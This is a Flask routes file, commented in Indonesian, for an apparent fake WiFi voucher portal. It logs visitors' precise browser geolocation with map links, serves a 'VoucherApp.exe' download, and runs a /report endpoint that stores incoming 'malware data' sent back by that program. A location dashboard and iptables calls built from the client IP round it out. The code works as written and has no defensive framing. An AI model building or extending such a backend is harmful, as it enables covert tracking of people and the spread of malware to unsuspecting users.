from flask import Blueprint, render_template, request, redirect, url_for, jsonify, send_from_directory, send_file
import os
import json 
from datetime import datetime

bp = Blueprint('routes', __name__)

APP_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(APP_DIR)
LOG_DIR = os.path.join(PROJECT_ROOT, 'logs')  # atau tetap 'logs' jika mau di dalam app/
LOCATION_LOG = os.path.join(LOG_DIR, 'location_log.jsonl')
MALWARE_LOG = os.path.join(LOG_DIR, 'malware_data.jsonl')
VOUCHER_FILE = os.path.join(PROJECT_ROOT, 'dist', 'VoucherApp', 'VoucherApp.exe')

os.makedirs(LOG_DIR, exist_ok=True)

@bp.route('/')
def index():
  return render_template('index.html')

@bp.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')
  
@bp.route('/access-granted')
def access_granted():
  return render_template('success.html')

@bp.route('/check-installation-status', methods=['POST'])
def check_installation_status():
  return jsonify({"installed": True})

@bp.route('/aktivasi')
def aktivasi():
    service = request.args.get('service', 'basic')
    return render_template('aktivasi.html', service=service)


@bp.route('/result', methods=['POST'])
def result():
  lat = request.form.get('latitude')
  lon = request.form.get('longitude')
  accuracy = request.form.get('accuracy')
  service = request.form.get('service', 'basic')
  
  if not lat or not lon:
    return redirect(url_for('routes.aktivasi', service=service))
  
  timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
  entry = {
    'timestamp': timestamp,
    'latitude': lat,
    'longitude': lon,
    'accuracy': accuracy,
    'maps_link': f"https://www.google.com/maps?q={lat},{lon}"    
  }
  
  try:
    with open(LOCATION_LOG, 'a', encoding='utf-8') as f:
      f.write(json.dumps(entry) + '\n')
  except Exception as e:
    print(f"Error writing to location log: {e}")
    
  return redirect(url_for('routes.aktivasi', service=service))

@bp.route('/get-location-data')
def get_location_data():
  try:
    with open(LOCATION_LOG, 'r', encoding='utf-8') as f:
      lines = f.readlines()
      
    entries = [json.loads(line.strip()) for line in lines if line.strip()]
    
    total_entries = len(entries)
    today = datetime.now().strftime('%Y-%m-%d')
    today_entries = len([e for e in entries if e['timestamp'].startswith(today)])
    accuracies = [float(e['accuracy']) for e in entries if 'accuracy' in e and e ['accuracy'].replace('.', '', 1).isdigit()]
    
    avg_accuracy = round(sum(accuracies) / len(accuracies), 2) if accuracies else 0
    best_accuracy = round(min(accuracies), 2) if accuracies else 0
    
    return jsonify({
      'entries': entries,
      'total_entries': total_entries,
      'today_entries': today_entries,
      'best_accuracy': best_accuracy,
      'avg_accuracy': avg_accuracy
    })
  except Exception as e:
    print(f"Error reading location log: {e}")
    return jsonify({
      'entries': [],
      'total_entries': 0,
      'today_entries': 0,
      'best_accuracy': 0,
      'avg_accuracy': 0
    })
    
@bp.route('/download-voucher-app')
def download_voucher_app():
    try:
        # Dapatkan direktori root project (parent dari app/)
        app_dir = os.path.dirname(os.path.abspath(__file__))  # D:\Voucher Wifi\app
        project_root = os.path.dirname(app_dir)  # D:\Voucher Wifi
        
        # Path ke file yang benar
        dist_folder = os.path.join(project_root, 'dist', 'VoucherApp')
        file_path = os.path.join(dist_folder, 'VoucherApp.exe')
        
        print(f"[DEBUG] App directory: {app_dir}")
        print(f"[DEBUG] Project root: {project_root}")
        print(f"[DEBUG] Dist folder: {dist_folder}")
        print(f"[DEBUG] File path: {file_path}")
        print(f"[DEBUG] File exists: {os.path.exists(file_path)}")
        
        if not os.path.exists(file_path):
            return "File VoucherApp.exe tidak ditemukan", 404
            
        # Gunakan absolute path untuk send_from_directory
        return send_from_directory(
            dist_folder,  # Absolute path ke folder
            'VoucherApp.exe',  # Nama file
            as_attachment=True,
            download_name='VoucherApp.exe'
        )
        
    except Exception as e:
        print(f"[ERROR] Exception in download route: {e}")
        import traceback
        traceback.print_exc()
        return f"Error: {str(e)}", 500
  
@bp.route('/report', methods=['POST'])
def report_malware():
  try:
    data = request.get_json()
    with open(MALWARE_LOG, 'a', encoding='utf-8') as f:
      f.write(json.dumps(data) + '\n')
    print("[✓] Data malware berhasil diterima dan dicatat")
    return jsonify({'status': 'success', 'message': 'Data malware berhasil diterima dan dicatat'})
  except Exception as e:
    print(f"[!] Gagal menyimpan data malware: {e}")
    return jsonify({"status": "error"}), 500
  
@bp.route('/store-voucher', methods=['POST'])
def store_voucher():
  try:
    data = request.get_json()
    code = data.get('voucher_code', '').strip().upper()
    if not code:
      return jsonify({'status': 'error', 'message': 'Voucher code is required'}), 400
    
    file_path = os.path.join(LOG_DIR, 'voucher_codes.txt')
    os.makedirs(os.path.dirname(file_path), exist_ok=True)
    
    with open(file_path, 'a', encoding='utf-8') as f:
      f.write(code + '\n')
      
    print(f"[+] Voucher code stored: {code}")
    return jsonify({'status': 'success', 'message': 'Voucher code stored successfully'})
  except Exception as e:
    print(f"[!] Gagal menyimpan voucher code: {e}")
    return jsonify({'status': 'error', 'message': 'Failed to store voucher code'}), 500
  
@bp.route('/validate-voucher', methods=['POST'])
def validate_voucher():
  try:
    data = request.get_json()
    code = data.get('voucher_code', '').strip().upper()
    if not code:
      return jsonify({'valid': False}), 400
    
    file_path = os.path.join(LOG_DIR, 'voucher_codes.txt')
    if not os.path.exists(file_path):
      return jsonify({'valid': False})
    
    with open(file_path, 'r', encoding='utf-8') as f:
      voucher = [line.strip().upper() for line in f.readlines()]
      
    if code in voucher:
      voucher.remove(code)
      with open(file_path, 'w', encoding='utf-8') as f:
        f.writelines(line + '\n' for line in voucher)
      return jsonify({'valid': True})
    
    
    print(f"[✗] Voucher {code} tidak ditemukan")
    return jsonify({'valid': False})
  except Exception as e:
    print(f"[!] Gagal memvalidasi voucher: {e}")
    return jsonify({'valid': False}), 500
  
@bp.route('/get-package-info')
def get_package_info():
  packages = {
      'basic': {'name': 'Standar', 'speed': '10 Mbps', 'duration': '1 jam', 'duration_seconds': 3600},
      'premium': {'name': 'Premium', 'speed': '25 Mbps', 'duration': '3 jam', 'duration_seconds': 10800},
      'unlimited': {'name': 'Unlimited', 'speed': '50 Mbps', 'duration': '24 jam', 'duration_seconds': 86400},
      'business': {'name': 'Bisnis', 'speed': '100 Mbps', 'duration': '72 jam', 'duration_seconds': 259200}
  }
  service = request.args.get('service', 'basic')
  return jsonify(packages.get(service, packages['basic']))

@bp.route('/unlock-internet', methods=['POST'])
def unlock_internet():
  ip = request.remote_addr
  try:
    os.system(f"iptables -I FORWARD -s {ip} -j ACCEPT")
    os.system(f"iptables -t NAT -I POSTROUTING -s {ip} -j MASQUERADE")
    print(f"[✓] Internet unlocked for {ip}")
    return jsonify({'status': 'success', 'ip': ip}), 200
  except Exception as e:
    print(f"[!] Failed to unlock internet for {ip}: {e}")
    return jsonify({'status': 'error', 'message': str(e)}), 500